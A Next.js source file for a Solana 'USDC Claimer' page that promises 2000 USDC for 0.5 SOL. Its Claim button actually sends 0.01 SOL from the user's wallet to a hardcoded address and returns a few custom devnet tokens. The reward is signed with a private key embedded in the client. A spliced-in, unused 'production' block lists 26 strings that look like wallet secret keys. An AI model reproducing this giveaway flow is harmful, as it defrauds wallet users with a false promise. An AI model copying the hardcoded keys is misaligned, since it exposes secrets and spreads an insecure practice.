/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "21X4sXgMcvWqxJVbgHXUgnmgvAAQ3caMHVgRaNwFRZfNvqiYzALwab3tp8N6UVf3ya2p2dehUM2NYBT65QY8uipY"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2ZA1fL7fCvPCcbXodjXS854NinvFhRB6hW5gmZft7C6y2tm1JPmfruqr2jBmNBd7eWCjZ4F9GzqccfzS2A33HrSW",
  "key1": "3CQVwizi14MULn56MxXJDEhL8uxedwRqXYfqV9iXaUNEbMkdKZgBaUXgaRDzXkEPvMYipZ2DvQxLqRysEgoviho7",
  "key2": "3phqQsWiJe8oQqmEPLtTr77ChVafuovDUEPocz215ZPxdcZgVXnTCkaADYZRWtREPWVmaEWmGtKWJwZegr3BZSxQ",
  "key3": "4T8EfKPqnnRvcCgzE9Ph3eKGe4D9vgXEsAhPNDQhtdVapLKebA5DfsSkXk7SF6poLDgC2ZZwpcv6LV263ZMsbg3g",
  "key4": "3f5T5Xdhtvp9w6AB6dQEeGGt7hME3AYXXPTmn7XiNYK5M3HFJzwRBsd5QLxKJrWXQCEvvf45MVHwRVATd7xYrMJE",
  "key5": "4AqxgM8ypWEpKZBXr3zfjaxXGZDs8ohojZFUYDz1t2UWGpHfx7sVJYVikKPPTaFMJ33ZWZ5cABZVZ7PGSdXR43qJ",
  "key6": "3tZKgtTGSQkkL9dAE8X5Zmkj99TFzuxCRUUP1EpoaWbRd295MNapatLssMWdknk5X6dB1YERMtjQSvZvNKLMAoSs",
  "key7": "45atUx5VGxUwpFAtt5PrnJqYvJoiPGFwWzobdLbhzWf9mhfxTV9jy9H6YqZsXeA2TkuBDtcKErp16eDmVVrc8o3J",
  "key8": "3tY3BV3aKvGowuY9F9jJLs4XFBnAYofqJ3zs4AXFv6ikctnjvSRFPA4D42N4G2YZgvXr9VGqUMUKpHx8gHdkCdet",
  "key9": "25ohPDHzeEswiVy4bbhCFmBNmfXBgTttzW7ZcXgbjjYRTkZUNFbhcN4c8X8E5qeS7EYFbk1drGrWzzckCuh4ue12",
  "key10": "5YubwHmtHazJmxkTxFa83DCjpSvkXxdcMmzJLKYnLjmsgKibMx1yf4y7Y8qSghR9VRmiQW1DUcZe95mm16QrsvnT",
  "key11": "5p3Mit9smfpqS82gyPeis6jEEwaG1o3JZKTJAiujtAmZcrKAbg4a3uspQWhuKnvcxYuBz4LE4D6mP6RdSpVawTEX",
  "key12": "63rxNfyA4v2a9CQQnsRhbZPGJy9LCfqpjye3CbSvJVu8PWA3wZh9DFnnNYbzjRJa89bHvLND7SrqJxXqrwj2ztqD",
  "key13": "2CMLoUMaNMH6FihnEuivh3CYYkZ7gtTUisgvfmqRwpz8okoHCb8qjQuFxpJF6LDLSQ6Z9RyGsdRC9DhUVGZALYxd",
  "key14": "5r3o7QuxwGi8qWRpyuwSStRptq14vEBxHzHbM6vi2VnaCUarDH3jLwr9Co41KDco1Xvs36vexmufZr3Hpvx5UHdq",
  "key15": "56nt5woTPD7r5cTJfLL3zJvhNswuMosXDCdpYnBTzVth3fcMy2yvYJZdqPEkmjQZ5sFYgkUQtnka1wnVJVK9fdAx",
  "key16": "caJcdT19cfA7dDEiVdRG6QoRz5xGnCxq1VowgpBsqZAzFJmXZEugi8pneUdm7FbDhzqvcvAKKiHpeG9fTxqNmie",
  "key17": "4jgfBNwimQEzn3MJip8xYcCeH2S99msQim9LeTHw3dKykAS4gaQkbx8NyC1oBFPgSZoVgsyDAVnRdKh3SFtvuaQ4",
  "key18": "GaHjHb2oxyibzdtPtRWvNNRd2uPcV39n5LdqsWDVwamrAL4bgy1Xqa95Nm5cKeyc3xe9rZaULFU99fE25guaKz7",
  "key19": "5EC4N1SLWzjfecDzSQPrp68BEscrBuCXW1oJ7o4AKP9tHLZTehaVTAy36VMmBZbcnCBDp3dwBj8VrnJnKyPqJ1mE",
  "key20": "5GtXtCTCtbCvvfFfsya3F3BS5uC8PZWDUqduw5upy2dSRkBN2MA8AYF6y6wRpijFTAEohaQFEsh5X524eRfRRFfn",
  "key21": "TxMvmxyNDAQLXYVxp32RaoFhwCqKZDVVu2hSezgRNuRBg219urczJjjsYoB4mrUkmh3aRQqHdqk4d7RMogNLN8c",
  "key22": "25mu5d2gx2D5UpbRavCAnZtDYP5EiF1BFqECMYKcwMsjfb4yK3b3DD7L4sBRNEnfY4vwyUPYBcVmuK1UuQWssszz",
  "key23": "34LyLTX3JUTeev1GSW7E6Ur9D8DcPzciRe2MDMEAzHZZXGJsyWBneMmZHSPsRk6chDRWgyev8p7DbbtwDDWMH5uL",
  "key24": "4RJCJZ6dA8uH6ijjEHrREMK9VeubzinSZmEveNcY8jfRHPhwyMGQr9YjT1xvzNPigPVXoGEkNt8HgvUK3W5v8cdQ",
  "key25": "3og9Jc9KNP2pyw7KEnwj7t7X5avRcCpqfLxZ2MH1Kdfg8gedrH5nrrmPEfT97iiss1EoTeVopDYhmr12UgyeBcCY"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
